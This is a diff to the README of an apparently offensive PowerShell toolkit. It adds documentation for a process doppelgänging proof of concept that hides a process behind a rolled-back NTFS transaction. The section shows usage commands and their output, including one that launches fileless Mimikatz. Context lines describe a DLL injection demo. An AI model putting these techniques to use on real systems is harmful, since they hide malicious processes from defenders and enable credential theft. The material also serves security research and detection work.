@@ -328,6 +328,53 @@ C:\PS> Get-SystemProcessInformation -ProcName note
 
 ## pwnd
 
+### Start-Eidolon
+
+This is a proof-of-concept for doppelgänging, which was recently presented by enSilo at BlackHat EU. In simple terms this process involves creating an NTFS transaction from a file on disk (any file will do). Next we overwrite the file in memory, create a section from the modified file and launch a process based on that section. Afterwards we roll back the transaction, leaving the original file unchanged but we end up with a process that appears to be backed by the original file. For a more complete description please review the reference in the script.
+
+```
+# Create a doppelgänger from a file on disk with explorer as the parent.
+# x64 Win10 RS3
+C:\PS> Start-Eidolon -Target C:\Some\File.Path -Eidolon C:\Some\Other\File.Path -ParentPID 12784 -Verbose
+VERBOSE: [+] Created transaction object
+VERBOSE: [+] Created transacted file
+VERBOSE: [+] Overwriting transacted file
+VERBOSE: [+] Created section from transacted file
+VERBOSE: [+] Rolled back transaction changes
+VERBOSE: [+] Opened handle the parent => explorer
+VERBOSE: [+] Created process from section
+VERBOSE: [+] Acquired Eidolon PBI
+VERBOSE: [+] Eidolon architecture is 64-bit
+VERBOSE: [+] Eidolon image base: 0x7FF6A0570000
+VERBOSE: [+] Eidolon entry point: 0x7FF6A05E40C8
+VERBOSE: [+] Created Eidolon process parameters
+VERBOSE: [+] Allocated memory in Eidolon
+VERBOSE: [+] Process parameters duplicated into Eidolon
+VERBOSE: [+] Rewrote Eidolon->PEB->pProcessParameters
+VERBOSE: [+] Created Eidolon main thread..
+True
+
+# Create a fileless Mimikatz doppelgänger with PowerShell as the parent.
+# x32 Win7
+C:\PS> Start-Eidolon -Target C:\Some\File.Path -Mimikatz -Verbose
+VERBOSE: [+] Created transaction object
+VERBOSE: [+] Created transacted file
+VERBOSE: [+] Overwriting transacted file
+VERBOSE: [+] Created section from transacted file
+VERBOSE: [+] Rolled back transaction changes
+VERBOSE: [+] Created process from section
+VERBOSE: [+] Acquired Eidolon PBI
+VERBOSE: [+] Eidolon architecture is 32-bit
+VERBOSE: [+] Eidolon image base: 0x400000
+VERBOSE: [+] Eidolon entry point: 0x4572D2
+VERBOSE: [+] Created Eidolon process parameters
+VERBOSE: [+] Allocated memory in Eidolon
+VERBOSE: [+] Process parameters duplicated into Eidolon
+VERBOSE: [+] Rewrote Eidolon->PEB->pProcessParameters
+VERBOSE: [+] Created Eidolon main thread..
+True
+```
+
 ### Stage-RemoteDll
 
 Stage-RemoteDll is a small function to demonstrate various Dll injection techniques (NtCreateThreadEx / QueueUserAPC / SetThreadContext / SetWindowsHookEx) on 32 and 64 bit architectures. While I have done some input validation & cleanup, this is mostly POC code. Note also that these techniques can easily be repurposed to directly execute shellcode in the remote process.
